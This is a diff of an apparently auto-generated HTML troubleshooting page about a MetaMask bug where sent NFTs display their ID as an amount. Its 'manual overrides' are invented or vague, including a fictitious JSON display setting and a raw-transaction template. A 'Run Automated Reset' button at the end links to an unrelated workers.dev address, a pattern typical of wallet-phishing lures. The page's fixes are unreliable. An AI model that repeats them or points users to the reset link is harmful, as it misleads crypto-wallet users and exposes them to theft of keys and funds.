@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #1a1a24;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #00adb5;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,38 +42,34 @@
 <h1>Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem encounter a bug when sending Non-Fungible Tokens (NFTs). The activity log for sending NFTs displays the NFT's ID as if it were the amount being transferred, rather than showing the actual NFT being sent.</li>
+<li>Users of the Metamask extension encounter a bug where the activity log for sending NFTs displays the NFT's ID as if it were the amount being sent, rather than the actual amount.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a misinterpretation of data types within the Metamask extension's code. Specifically, the extension is incorrectly parsing the NFT's unique identifier as a numerical value representing the amount of tokens to be transferred, rather than recognizing it as an identifier for the NFT itself.</li>
+<li>This bug occurs due to a misinterpretation of data types within the Metamask extension, where the ID of the NFT is mistakenly treated as a quantity.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To temporarily resolve this issue, users can attempt the following manual overrides:</li>
-<li>Clear the Metamask extension's cache and restart the browser.</li>
-<li>Manually input the NFT's ID in the transfer field, ensuring it is correctly formatted.</li>
-<li>Utilize a raw transaction interface to send the NFT, bypassing the affected functionality:</li>
+<li>To resolve this issue, users can attempt the following manual overrides:</li>
+<li>Check the transaction details on the Ethereum blockchain explorer to verify the correct amount of NFTs sent.</li>
+<li>Ensure that the Metamask extension is updated to the latest version.</li>
+<li>Use the following JSON configuration to override the display settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0xYourWalletAddress&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0xRecipientAddress&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;20000&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;20000000000&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;nonce&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0xNFTTransferFunctionCall&quot;</span>
+<span class="w">  </span><span class="nt">&quot;nftDisplay&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;showIdAsAmount&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex transaction constructions.</p>
+<p>Consider using an external console to execute these commands for a more stable experience.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured.</li>
-<li>Ethereum wallet with sufficient balance for transaction fees.</li>
-<li>NFT to be transferred is owned by the sender's wallet.</li>
+<li>Ethereum wallet set up and funded.</li>
+<li>Basic understanding of Ethereum transactions and NFTs.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social Import Onboarding</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-manage-tokens-miss-match-with-net.html">Metamask Extension Bug Assets Manage Tokens Miss Match With Net</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
